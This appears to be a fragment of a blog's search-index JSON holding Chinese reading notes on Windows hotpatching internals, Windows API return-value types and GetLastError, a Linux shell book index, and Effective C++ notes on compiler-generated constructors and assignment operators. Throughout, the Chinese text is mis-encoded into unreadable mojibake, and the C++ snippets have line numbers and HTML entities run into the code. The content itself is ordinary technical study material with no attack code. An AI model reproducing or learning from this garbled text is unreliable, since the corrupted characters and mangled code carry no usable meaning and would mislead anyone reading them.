é‡æ–°å¼•å¯¼ä¸€å°æœºå™¨ä»¥ä¾¿æŠŠæœ€æ–°çš„è¡¥ä¸éƒ½åº”ç”¨ä¸Šï¼Œè¿™å¯¹äºæœåŠ¡å™¨æ¥è¯´å¯èƒ½ä¼šæ„å‘³ç€ä¸€æ®µæ˜¾è‘—çš„å®•æœºæ—¶é—´ï¼Œè¿™ä¹Ÿæ­£æ˜¯ä¸ºä»€ä¹ˆWindowsè¦æ”¯æŒè¿è¡Œæ—¶åˆ»çš„è¡¥ä¸æ–¹æ³•ï¼Œç§°ä¸ºçƒ­è¡¥ä¸ï¼ˆhot patchï¼Œæˆ–ç®€åŒ–ä¸ºhotpatchï¼‰ã€‚ä¸ä¹‹ç›¸åçš„æ˜¯å†·è¡¥ä¸ï¼ˆcoldpatchï¼‰ï¼Œå®ƒè¦æ±‚ä¸€æ¬¡é‡æ–°å¼•å¯¼ã€‚çƒ­è¡¥ä¸å¹¶éåªæ˜¯ç®€å•åœ°å…è®¸æ–‡ä»¶å¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«è¦†ç›–;ç›¸ååœ°ï¼Œå®ƒåŒ…æ‹¬äº†ä¸€ç³»åˆ—å¯èƒ½ä¼šè¢«è¯·æ±‚æ‰§è¡Œçš„å¤æ‚æ“ä½œï¼ˆè¿™äº›æ“ä½œä¹Ÿå¯èƒ½ä¼šç»„åˆèµ·æ¥ï¼‰ã€‚ çƒ­è¡¥ä¸æ‰§è¡Œæ“ä½œ ä¸‹è¡¨åˆ—å‡ºäº†è¿™äº›æ“ä½œï¼š æ“ä½œ å«ä¹‰ ç”¨é€” æ˜ åƒæ–‡ä»¶æ”¹åç§°ï¼ˆRename Image) æ›¿æ¢ç£ç›˜ä¸Šä¸€ä¸ªæ­£åœ¨è¢«å…¶ä»–åº”ç”¨ç¨‹åºä½¿ç”¨çš„DLLï¼Œæˆ–è€…æ›¿æ¢ç£ç›˜ä¸Šä¸€ä¸ªå·²ç»è¢«å†…æ ¸åŠ è½½åˆ°ç³»ç»Ÿä¸­çš„é©±åŠ¨ç¨‹åº å½“ä¸€ä¸ªç”¨æˆ·æ¨¡å¼çš„åº“éœ€è¦å®Œæ•´åœ°è¢«æ›¿æ¢çš„æ—¶å€™ï¼Œå†…æ ¸å¯ä»¥æ£€æµ‹åˆ°å“ªäº›è¿›ç¨‹å’ŒæœåŠ¡æ­£åœ¨å¼•ç”¨è¯¥åº“ï¼Œå°†å®ƒä»¬å¸è½½å‡ºå†…å­˜ï¼Œç„¶åæ›´æ–°DLLï¼Œå†é‡æ–°å¯åŠ¨è¿™äº›ç¨‹åºå’ŒæœåŠ¡ï¼ˆé€šè¿‡é‡å¯ç®¡ç†å™¨[restart manager]æ¥å®Œæˆï¼‰ã€‚å½“ä¸€ä¸ªé©±åŠ¨ç¨‹åºéœ€è¦è¢«æ›¿æ¢çš„æ—¶å€™ï¼Œå†…æ ¸å¯ä»¥å¸è½½è¯¥é©±åŠ¨ç¨‹åºï¼ˆè¯¥é©±åŠ¨ç¨‹åºè¦æ±‚æœ‰ä¸€ä¸ªå¸è½½ä¾‹ç¨‹ï¼‰ï¼Œæ›´æ–°é©±åŠ¨ç¨‹åºï¼Œç„¶åé‡æ–°åŠ è½½æ›¿æ¢åçš„é©±åŠ¨ç¨‹åº å¯¹è±¡äº¤æ¢ï¼ˆObject Swapï¼‰ ä»¥åŸå­æ“ä½œçš„æ–¹å¼æ›´æ”¹å¯¹è±¡ç›®å½•åå­—ç©ºé—´ä¸­çš„ä¸€ä¸ªå¯¹è±¡ å½“ä¸€ä¸ªæ–‡ä»¶ï¼ˆå¾€å¾€æ˜¯å·²çŸ¥çš„DLLï¼‰éœ€è¦è¢«åŸå­å‡¡äº‹ä¿®æ”¹åç§°ï¼Œä½†ä¸å½±å“ä»»ä½•å¯èƒ½æ­£åœ¨ä½¿ç”¨è¯¥æ–‡ä»¶çš„è¿›ç¨‹æ—¶ï¼ˆæ‰€ä»¥ï¼Œè¿™äº›è¿›ç¨‹å¯ä»¥ç«‹å³ä½¿ç”¨æ–°çš„æ–‡ä»¶ï¼Œä¸”ä»ç„¶ä½¿ç”¨è€çš„å¥æŸ„ï¼Œä½†ä¸è¦æ±‚åº”ç”¨ç¨‹åºé‡æ–°å¯åŠ¨ï¼‰ è¡¥ä¸å‡½æ•°ä»£ç ï¼ˆPatch Function Codeï¼‰ å°†ä¸€ä¸ªæ˜ åƒæ–‡ä»¶ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå‡½æ•°çš„ä»£ç æ›¿æ¢ä¸ºæ–°çš„ç‰ˆæœ¬ å¦‚æœåœ¨è¿è¡Œæ—¶åˆ»ä¸€ä¸ªDLLæˆ–é©±åŠ¨ç¨‹åºä¸èƒ½è¢«æ›¿æ¢æˆ–ä¿®æ”¹åç§°ï¼Œåˆ™è¯¥æ˜ åƒä¸­çš„å‡½æ•°å¯ä»¥ç›´æ¥è¢«æ‰“ä¸Šè¡¥ä¸ã€‚å¯¹äºä¸€ä¸ªåŒ…å«äº†æ–°ä»£ç çš„çƒ­è¡¥ä¸DLLï¼Œå½“è€çš„å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šè·³è½¬åˆ°æ–°çš„ä»£ç ä¸­ã€‚ åˆ·æ–°ç³»ç»ŸDLLï¼ˆRefresh System DLLï¼‰ é‡æ–°ä¸ºNtdll.dllåŠ è½½å†…å­˜æ˜ å°„åŒºå¯¹è±¡ Windowsçš„ç³»ç»ŸåŸç”Ÿåº“Ntdll.dllåªåœ¨ç³»ç»Ÿå¼•å¯¼è¿‡ç¨‹ä¸­è¢«åŠ è½½ä¸€æ¬¡ï¼Œä»¥ååªæ˜¯è¢«ç®€å•åœ°å¤åˆ¶åˆ°æ¯ä¸ªæ–°è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚å¦‚æœå®ƒå‘—çƒ­è¡¥ä¸äº†ï¼Œé‚£ä¹ˆï¼Œç³»ç»Ÿå¿…é¡»åˆ·æ–°è¿™ä¸€å†…å­˜åŒºå¯¹è±¡ï¼Œä»¥ä¾¿åŠ è½½æ–°çš„ç‰ˆæœ¬ ç‰¹æ€§ è¿è¡Œæ—¶åˆ»å¸è½½ çƒ­è¡¥ä¸æ–‡ä»¶çš„æ„æˆé™¤äº†åŒ…æ‹¬è¦æ›¿æ¢çš„å‡½æ•°éƒ¨åˆ†ï¼Œè¿˜åŒ…æ‹¬ä¸€ä¸ªUpdate.exeçš„ç¨‹åºä»¥åŠä¸€ä¸ªé¢å¤–çš„.hpçƒ­è¡¥ä¸æ–‡ä»¶ã€‚ Update.exeï¼šå®Œæˆè¯¥è¡¥ä¸çš„æå–å·¥ä½œï¼Œä¹Ÿæ‰§è¡Œç›¸åº”çš„æ›´æ–°è¿‡ç¨‹ã€‚ .hpçƒ­è¡¥ä¸æ–‡ä»¶ï¼šæ­¤æ–‡ä»¶åŒ…å«ä¸€ä¸ªç‰¹æ®Šçš„PEå¤´ï¼Œç§°ä¸º.HOT1ã€‚è¯¥PEå¤´åŒ…å«äº†ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œæè¿°äº†è¯¥æ–‡ä»¶ä¸­å‡ºç°çš„å„ç§è¡¥ä¸æè¿°ç¬¦ï¼ˆpatch descriptorï¼‰ã€‚æ¯ä¸€ä¸ªè¡¥ä¸æè¿°è¿°ç¬¦æŒ‡æ˜äº†åœ¨åŸå§‹æ–‡ä»¶ä¸­éœ€è¦è¢«è¡¥ä¸çš„åç§»ä½ç½®ã€ä¸€ä¸ªéªŒè¯æœºåˆ¶ï¼ˆå®ƒå¯ä»¥åŒ…å«ä¸€ä»½è€æ•°æ®çš„ç®€å•æ¯”è¾ƒã€ä¸€ä¸ªæ ¡éªŒå’Œï¼Œæˆ–è€…ä¸€ä¸ªæ•£åˆ—å€¼ï¼‰ï¼Œä»¥åŠå¾…è¡¥ä¸çš„æ–°æ•°æ®ã€‚å†…æ ¸å°†è§£æè¿™äº›æè¿°ç¬¦ï¼Œå¹¶ä¸”æ‰§è¡Œæ°å½“çš„ä¿®æ”¹åŠ¨ä½œã€‚è‹¥æ˜¯è¢«ä¿æŠ¤çš„è¿›ç¨‹ï¼ˆprotected processï¼Œæœ‰å…³è¿›ç¨‹çš„æ›´å¤šä¿¡æ¯ï¼Œå‚è§ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹ç¬¬5ç« ï¼‰ï¼Œæˆ–è€…å…¶ä»–ç»è¿‡æ•°å­—ç­¾åçš„äºŒè¿›åˆ¶æ˜ åƒï¼Œåœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œçƒ­è¡¥ä¸ä¹Ÿå¿…é¡»è¢«ç»è¿‡æ•°å­—ç­¾åï¼Œä»¥é¿å…é’ˆå¯¹æ•æ„Ÿæ–‡ä»¶æˆ–è¿›ç¨‹æ‰§è¡Œâ€œä¼ªé€ çš„â€è¡¥ä¸ã€‚ åœ¨ç¼–è¯‘æ—¶åˆ»å¯¹çƒ­è¡¥ä¸çš„æ”¯æŒï¼Œæ˜¯é€šè¿‡åœ¨æ¯ä¸ªå‡½æ•°çš„å¼€å§‹å¤„åŠ å…¥7ä¸ªé¢å¤–çš„å­—èŠ‚æ¥åšåˆ°çš„ã€‚å…¶ä¸­5ä¸ªå­—èŠ‚è¢«çœ‹åšå‰ä¸€ä¸ªå‡½æ•°çš„ç»“æŸéƒ¨åˆ†ï¼Œ2ä¸ªå­—èŠ‚è¢«çœ‹ä½œå‡½æ•°å‰ç¼€ï¼ˆfunction prologï¼‰éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°çš„å¼€å§‹ã€‚ é™åˆ¶ ä½¿ç”¨çƒ­è¡¥ä¸ä¹Ÿå­˜åœ¨ä¸€äº›é™åˆ¶ï¼š ä¸å®‰å…¨è½¯ä»¶çš„ä¸å…¼å®¹ã€‚åƒå®‰å…¨è½¯ä»¶ç±»çš„ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå¯èƒ½ä¼šé˜»æ­¢è¿™æ ·çš„è¡¥ä¸ï¼›è¡¥ä¸ä¹Ÿå¯èƒ½ä¸ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºçš„æ“ä½œç³»ç»Ÿä¸å…¼å®¹ è¡¥ä¸è¦ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶çš„å¯¼å‡ºè¡¨æˆ–å¯¼å…¥è¡¨ è¡¥ä¸è¦æ”¹å˜æ•°æ®ç»“æ„ï¼Œä¿®æ­£æ— é™å¾ªç¯ï¼Œæˆ–è€…åŒ…å«å†…è”çš„æ±‡ç¼–ä»£ç ","tags":[{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"ä¹¦ç±-ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"}]},{"title":"è¿”å›å€¼ç±»å‹çš„è§„èŒƒ","date":"2023-10-27T01:24:02.455Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹/ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹1-1-è¿”å›å€¼ç±»å‹çš„è§„èŒƒ/","text":"å‚ç…§ Windows å¯¹ç¨‹åºé”™è¯¯çš„å¤„ç†ä¸­ï¼Œå‡½æ•°å¸¸ç”¨è¿”å›å€¼çš„è®¾ç½®ï¼Œä½œä¸ºC++å¼€å‘ï¼Œä¹Ÿåº”è¯¥å‚ç…§è¿™ä¸€æ ‡å‡†ã€‚ å½“è°ƒç”¨ä¸€ä¸ª Windows å‡½æ•°æ—¶ï¼Œå®ƒé¦–å…ˆè¦æ£€éªŒä¼ é€’ç»™å®ƒçš„çš„å„ä¸ªå‚æ•°çš„æœ‰æ•ˆæ€§ï¼Œç„¶åå†è®¾æ³• æ‰§è¡Œä»»åŠ¡ã€‚å¦‚æœä¼ é€’äº†ä¸€ä¸ªæ— æ•ˆå‚æ•°ï¼Œæˆ–è€…ç”±äºæŸç§åŸå› æ— æ³•æ‰§è¡Œè¿™é¡¹æ“ä½œï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿå°± ä¼šè¿”å›ä¸€ä¸ªå€¼ï¼ŒæŒ‡æ˜è¯¥å‡½æ•°åœ¨æŸç§ç¨‹åº¦ä¸Šè¿è¡Œå¤±è´¥äº†ã€‚è¡¨ 1 - 1åˆ—å‡ºäº†å¤§å¤šæ•° Windows å‡½æ•°ä½¿ç”¨ çš„è¿”å›å€¼çš„æ•°æ®ç±»å‹ Windows å‡½æ•°å¸¸ç”¨çš„è¿”å›å€¼ç±»å‹ æ•°æ®ç±»å‹ è¡¨ç¤ºå¤±è´¥çš„å€¼ void è¯¥å‡½æ•°çš„è¿è¡Œä¸å¯èƒ½å¤±è´¥ã€‚Windows å‡½æ•°çš„è¿”å›å€¼ç±»å‹å¾ˆå°‘æ˜¯ void bool å¦‚æœå‡½æ•°è¿è¡Œå¤±è´¥ï¼Œé‚£ä¹ˆè¿”å›å€¼æ˜¯0ï¼Œå¦åˆ™è¿”å›çš„æ˜¯é0å€¼ã€‚æœ€å¥½å¯¹è¿”å›å€¼è¿›è¡Œæµ‹è¯•ï¼Œä»¥ç¡®å®šå®ƒæ˜¯0è¿˜æ˜¯é0ã€‚ä¸è¦æµ‹è¯•è¿”å›å€¼æ˜¯å¦ä¸ºTRUE HANDLE å¦‚æœå‡½æ•°è¿è¡Œå¤±è´¥ï¼Œåˆ™è¿”å›å€¼é€šå¸¸æ˜¯ NULLï¼Œå¦åˆ™è¿”å›å€¼ä¸º HANDLEï¼Œç”¨äºæ ‡è¯†ä½ å¯ä»¥æ“ä½œçš„ä¸€ä¸ªå¯¹è±¡ã€‚æ³¨æ„ï¼Œæœ‰äº›å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¥æŸ„å€¼ INVALID_ HANDLE_VALUEï¼Œå®ƒè¢«å®šä¹‰ä¸º -1ã€‚å‡½æ•°çš„Platform SDK æ–‡æ¡£å°†ä¼šæ¸…æ¥šåœ°è¯´æ˜è¯¥å‡½æ•°è¿è¡Œå¤±è´¥æ—¶è¿”å›çš„æ˜¯ NULL è¿˜æ˜¯ INVALID_HANDLE_VALID PVOID å¦‚æœå‡½æ•°è¿è¡Œå¤±è´¥ï¼Œåˆ™è¿”å›å€¼æ˜¯ NULLï¼Œå¦åˆ™è¿”å›PVOIDï¼Œä»¥æ ‡è¯†æ•°æ®å—çš„å†…å­˜åœ°å€ LONG/DWORD è¿™æ˜¯ä¸ªéš¾ä»¥å¤„ç†çš„å€¼ã€‚è¿”å›æ•°é‡çš„å‡½æ•°é€šå¸¸è¿”å›LONGæˆ–DWORDã€‚å¦‚æœç”±äºæŸç§åŸå› ï¼Œå‡½æ•°æ— æ³•å¯¹æƒ³è¦è¿›è¡Œè®¡æ•°çš„å¯¹è±¡è¿›è¡Œè®¡æ•°ï¼Œé‚£ä¹ˆè¯¥å‡½æ•°é€šå¸¸è¿”å› 0æˆ–-1ï¼ˆæ ¹æ®å‡½æ•°è€Œå®šï¼‰ã€‚å¦‚æœè°ƒç”¨çš„å‡½æ•°åæ‚”äº†LONG/DWORDï¼Œé‚£ä¹ˆéœ€è¦é˜…è¯»ç›¸åº”çš„å‡½æ•°è¯´æ˜ï¼Œä»¥ç¡®ä¿èƒ½æ­£ç¡®æ£€æŸ¥æ½œåœ¨çš„é”™è¯¯ã€‚ ä¸€ä¸ª Windows å‡½æ•°è¿”å›çš„é”™è¯¯ä»£ç å¯¹äº†è§£è¯¥å‡½æ•°ä¸ºä»€ä¹ˆä¼šè¿è¡Œå¤±è´¥å°å°å¾ˆæœ‰ç”¨ã€‚ ä»ç³»ç»Ÿå†…éƒ¨æ¥è®²ï¼Œå½“ä¸€ä¸ªWindowså‡½æ•°æ£€æµ‹åˆ°ä¸€ä¸ªé”™è¯¯æ—¶ï¼Œå®ƒä¼šä½¿ç”¨ä¸€ä¸ªç§°ä¸ºçº¿ç¨‹æœ¬åœ°å­˜å‚¨å™¨ï¼ˆthread-local storageï¼‰çš„æœºåˆ¶ï¼Œå°†ç›¸åº”çš„é”™è¯¯ä»£ç å·ç ä¸è°ƒç”¨çš„çº¿ç¨‹å…³è”èµ·æ¥ã€‚è¿™å°†ä½¿çº¿ç¨‹èƒ½å¤Ÿäº’ç›¸ç‹¬ç«‹è¿è¡Œï¼Œè€Œä¸ä¼šå½±å“å„è‡ªçš„é”™è¯¯ä»£ç ã€‚å½“å‡½æ•°è¿”å›æ—¶ï¼Œå®ƒçš„è¿”å›å€¼å°±èƒ½æŒ‡æ˜ä¸€ä¸ªé”™è¯¯å·²ç»å‘ç”Ÿã€‚è‹¥è¦ç¡®å®šè¿™æ˜¯ä¸ªä»€ä¹ˆé”™è¯¯ï¼Œåˆ™éœ€è¦è°ƒç”¨ GetLastError å‡½æ•°ï¼š 1DWORD GetLastError","tags":[{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","slug":"ä¹¦ç±-ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"},{"name":"è§„èŒƒ","slug":"è§„èŒƒ","permalink":"https://hodlyounger.github.io/tags/%E8%A7%84%E8%8C%83/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"}]},{"title":"ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹ å¯¼è¯»","date":"2023-10-27T01:24:02.453Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆã€‹/ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹/","text":"å¯¼è¯»ç›®å½•","tags":[{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"ä¹¦ç±/ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹","slug":"ä¹¦ç±-ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8%E3%80%8B/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨-ç¬¬3ç‰ˆã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8-%E7%AC%AC3%E7%89%88%E3%80%8B/"}]},{"title":"ã€Effective C++ã€‘å¯¼è¯»","date":"2023-10-27T01:24:02.452Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient C++ã€‹/ã€Effective CPPã€‘/","text":"æ¦‚è¿°ï¼š ã€ŠEffective C++ã€‹ é˜…è¯»ç¬”è®° ç›¸å…³æ–‡ç« ï¼š ç®€ä»‹ - Effective Modern C++ å¯¼è¯»ç›®å½• ã€Effective CPPã€‘2_constå…³é”®å­— ã€Effective CPPã€‘3_ç¡®å®šå¯¹è±¡ä½¿ç”¨å‰åˆå§‹åŒ– ã€Effective CPPã€‘4_äº†è§£CPPé»˜è®¤åˆ›å»ºå¹¶è°ƒç”¨çš„å‡½æ•°","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"CPP/effectivecpp","slug":"CPP-effectivecpp","permalink":"https://hodlyounger.github.io/tags/CPP-effectivecpp/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠEfficient C++ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient-C-ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"ã€Effective C++ã€‘<4> äº†è§£C++é»˜è®¤åˆ›å»ºå¹¶è°ƒç”¨çš„å‡½æ•°","date":"2023-10-27T01:24:02.451Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient C++ã€‹/ã€Effective CPPã€‘4_äº†è§£CPPé»˜è®¤åˆ›å»ºå¹¶è°ƒç”¨çš„å‡½æ•°/","text":"[toc] ç¼–è¯‘å™¨åˆ›å»ºçš„å‡½æ•° ç©ºç±»ï¼š 1class Empty&#123;&#125;; ç¼–è¯‘å™¨é»˜è®¤æ·»åŠ çš„å‡½æ•°ï¼š 12345678910// defaultFunc.hclass Empty&#123;public: // å½“ç¨‹åºä¸­æœªå®šä¹‰ä»¥ä¸‹å‡½æ•°æ—¶ç¼–è¯‘å™¨é»˜è®¤æ·»åŠ  Empty() &#123; &#125; // é»˜è®¤æ„é€ å‡½æ•° Empty(const Empty&amp; rhs) &#123; &#125; // æ‹·è´æ„é€ å‡½æ•° ~Empty() &#123; &#125; // ææ„å‡½æ•° Empty&amp; operator=(const Empty&amp; rhs) &#123; &#125; // æ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°&#125;; æ‹·è´æ„é€ å‡½æ•°ä¸æ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•° æ‹·è´æ„é€ å‡½æ•°å’Œæ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°ï¼Œç¼–è¯‘å™¨åˆ›å»ºçš„ç‰ˆæœ¬åªæ˜¯å•çº¯åœ°å°†æ¥æºå¯¹è±¡çš„æ¯ä¸€ä¸ªéé™æ€æˆå‘˜å˜é‡æ‹·è´åˆ°ç›®æ ‡å¯¹è±¡ã€‚å¦‚ä¸‹æ¨¡æ¿ç±» NamedObjectï¼Œå®ƒå…è®¸ä½ å°†ä¸€ä¸ªåç§°å’Œç±»å‹ä¸º T çš„å¯¹è±¡äº§ç”Ÿå…³è”ã€‚ 123456789101112131415161718192021222324// copy.h#ifndef __COPY_H__#define __COPY_H__#include &lt;iostream&gt;template&lt;typename T&gt;class NamedObject&#123;public: /** ç”±äºå…¶ä¸­å£°æ˜äº†ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨äºæ˜¯ä¸å†ä¸ºå®ƒåˆ›å»ºé»˜è®¤æ„é€ å‡½æ•°ã€‚ è¿™å¾ˆé‡è¦ï¼Œæ„å‘³å¦‚æœä½ ç”¨å¿ƒè®¾è®¡ä¸€ä¸ªç±»ï¼Œå…¶æ„é€ å‡½æ•°è¦æ±‚å®å‚ï¼Œ ä½ å°±æ— é¡»æ‹…å¿ƒç¼–è¯‘å™¨ä¼šæ¯«æ— æŒ‚è™‘åœ°ä¸ºä½ æ·»åŠ ä¸€ä¸ªæ— å®å‚æ„é€ å‡½æ•°ï¼ˆå³é»˜è®¤æ„é€ å‡½æ•°ï¼‰è€Œé®ç›–æ‰ä½ çš„ç‰ˆæœ¬ã€‚ */ NamedObject(const char *name, const T&amp; value) : nameValue(name), objectValue(value) &#123;&#125; NamedObject(const std::string&amp; name, const T&amp; value) : nameValue(name), objectValue(value) &#123;&#125;private: std::string nameValue; T objectValue;&#125;;#endif // __COPY_H__ 1234567891011121314// main.cpp#include &quot;copy.h&quot;int main()&#123; /** NamedObject æ—¢æ²¡æœ‰å£°æ˜æ‹·è´æ„é€ å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰å£°æ˜æ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°ï¼Œ æ‰€ä»¥ç¼–è¯‘å™¨ä¼šä¸ºå®ƒåˆ›å»ºé‚£äº›å‡½æ•°ï¼ˆå¦‚æœå®ƒä»¬è¢«è°ƒç”¨çš„è¯ï¼‰ã€‚ ç°åœ¨ï¼Œçœ‹çœ‹æ‹·è´æ„é€ å‡½æ•°çš„ç”¨æ³• */ NamedObject&lt;int&gt; no1(&quot;Smallest Prime Number&quot;, 2); NamedObject&lt;int&gt; no2(no1); return 0;&#125; ç¼–è¯‘å™¨æ‹’ç»åˆ›å»ºæ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°çš„æƒ…å†µ ç¼–è¯‘å™¨ä¸º NamedObject&lt;int&gt; æ‰€äº§ç”Ÿçš„æ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°ï¼Œå…¶è¡Œä¸ºåŸºæœ¬ä¸Šä¸æ‹·è´æ„é€ å‡½æ•°å¦‚å‡ºä¸€è¾™ï¼Œä½†ä¸€èˆ¬è€Œè¨€åªæœ‰å½“ç”Ÿå‡ºçš„ä»£ç åˆæ³•ä¸”æœ‰é€‚å½“æœºä¼šè¯æ˜å®ƒæœ‰æ„ä¹‰ï¼Œå…¶è¡¨ç°æ‰ä¼šå¦‚æˆ‘å…ˆå‰æ‰€è¯´ã€‚ä¸‡ä¸€ä¸¤ä¸ªæ¡ä»¶æœ‰ä¸€ä¸ªä¸ç¬¦åˆï¼Œç¼–è¯‘å™¨ä¼šæ‹’ç»ä¸ºç±»äº§ç”Ÿæ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°ã€‚ ç¼–è¯‘å™¨æ‹’ç»åˆ›å»ºæ‹·è´èµ‹å€¼æ“ä½œç¬¦å‡½æ•°æƒ…å†µï¼š æˆå‘˜å‡½æ•°ä¸ºå¼•ç”¨ç±»å‹ã€‚ 